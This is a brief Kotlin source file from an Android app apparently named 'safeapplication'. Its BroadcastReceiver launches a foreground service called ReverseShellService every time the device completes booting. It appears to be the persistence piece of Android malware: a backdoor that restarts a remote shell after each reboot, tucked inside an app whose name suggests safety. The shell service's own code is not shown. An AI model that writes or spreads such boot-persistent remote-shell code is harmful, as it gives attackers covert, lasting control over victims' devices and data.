package com.solisindago.safeapplication

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(c: Context, i: Intent) {
        if (Intent.ACTION_BOOT_COMPLETED == i.action) {
            c.startForegroundService(Intent(c, ReverseShellService::class.java))
        }
    }
}
